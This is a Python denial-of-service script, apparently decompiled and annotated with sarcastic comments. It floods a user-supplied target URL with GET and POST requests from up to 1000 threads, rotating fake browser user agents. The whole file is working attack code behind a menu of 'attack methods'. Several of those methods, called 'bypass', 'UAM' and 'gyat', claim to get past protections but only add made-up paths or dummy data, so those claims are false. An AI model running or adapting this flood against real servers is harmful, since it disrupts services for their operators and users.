# its easy to decompile this things

import random
import requests
import time
from concurrent.futures import ThreadPoolExecutor  # This DoS tool brought to you by Python's standard library, just rebranded!

RED = "\033[91m"
CYAN = "\033[96m"
RESET = "\033[0m"

USER_AGENTS = [
    "Mozilla/5.0 (X11; openSUSE Leap 15.3; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Safari/537.36",
    "Mozilla/5.0 (X11; Debian 10; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/114.0.1823.82 Safari/537.36",
    "Mozilla/5.0 (X11; CentOS 7; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/1.52.126 Safari/537.36",
    "Mozilla/5.0 (X11; Debian 11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/114.0.1823.82 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora 36; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/1.52.126 Safari/537.36",
    "Mozilla/5.0 (X11; Debian 11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/115.0 Safari/537.36",
    "Mozilla/5.0 (X11; openSUSE Leap 15.4; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Vivaldi/5.6.2867.58 Safari/537.36",
    "Mozilla/5.0 (X11; Debian 11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/1.52.126 Safari/537.36",
    "Mozilla/5.0 (X11; openSUSE Leap 15.4; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Vivaldi/5.6.2867.58 Safari/537.36",
    "Mozilla/5.0 (X11; Debian 10; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/115.0 Safari/537.36"
]

def send_request(target_url, method):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    
    try:
        if method == "https":
            response = requests.get(target_url, headers=headers, timeout=5)
        elif method == "flood":
            response = requests.post(target_url, headers=headers, data={"test": "flood"}, timeout=5)
        elif method == "bypass":
            response = requests.get(target_url + "/bypass", headers=headers, timeout=5)  # Because every server has a /bypass endpoint, right?
        elif method == "uam":
            response = requests.get(target_url + "/uam", headers=headers, timeout=5)  # Universal UAM endpoint, just add /uam and profit!
        elif method == "tls":
            response = requests.get(target_url, headers=headers, timeout=5, verify=False)  # Disabling TLS verification: truly next-gen security bypass
        elif method == "r2":
            response = requests.get(target_url + "/r2", headers=headers, timeout=5)
        elif method == "gyat":
            response = requests.post(target_url, headers=headers, data={"attack": "gyat"}, timeout=5)  # The legendary gyat attack, servers beware
        
        print(f"{CYAN}[{method.upper()}] Sent to {RESET}{target_url} -> {CYAN}Status: {response.status_code}{RESET}")
    except Exception as e:
        print(f"{RED}[ERROR] {RESET}{method.upper()} failed: {e}")

# max_workers=1000, because your laptop is secretly a supercomputer
# No proxy support, so your IP can finally get the attention it deserves
# All attacks from a single IP, Cloudflare is shaking in its boots

def run_attack(target_url, method, num_requests):
    print(f"{RED}⚠️ Running {method.upper()} attack on {target_url} ⚠️{RESET}")
    
    with ThreadPoolExecutor(max_workers=1000) as executor:
        for _ in range(num_requests):
            executor.submit(send_request, target_url, method)
    
    print(f"{CYAN}✅ Attack completed! ✅{RESET}")

def display_menu():
    print("".join([
        "\n",
        f"{CYAN} Author: John Felix {RESET}",
        f"\n\n{CYAN}🔥 Attack Methods 🔥{RESET}",
        f"\n\n1. {CYAN}Flood{RESET}",
        f"\n2. {CYAN}Bypass{RESET}",
        f"\n3. {CYAN}UAM{RESET}",
        f"\n4. {CYAN}TLS{RESET}",
        f"\n5. {CYAN}HTTPS{RESET}",
        f"\n6. {CYAN}R2{RESET}",
        f"\n7. {CYAN}Gyat{RESET}",
        "\n"
    ]))

if __name__ == "__main__":
    display_menu()
    
    while True:
        choice = input(f"{CYAN}Choose a method (1-7 or 'exit'): {RESET}").strip().lower()
        
        if choice == "exit":
            print(f"{RED}Exiting... Goodbye!{RESET}")
            break
            
        methods = {
            "1": "flood",
            "2": "bypass",
            "3": "uam",
            "4": "tls",
            "5": "https",
            "6": "r2",
            "7": "gyat"
        }
        
        method = methods.get(choice)
        
        if not method:
            print(f"{RED}Invalid choice, please try again.{RESET}")
            continue
            
        target_url = input(f"{CYAN}Enter target URL: {RESET}")
        
        try:
            num_requests = int(input(f"{CYAN}Enter number of requests: {RESET}"))
            run_attack(target_url, method, num_requests)
        except ValueError:
            print(f"{RED}Invalid number of requests. Please enter a valid integer.{RESET}")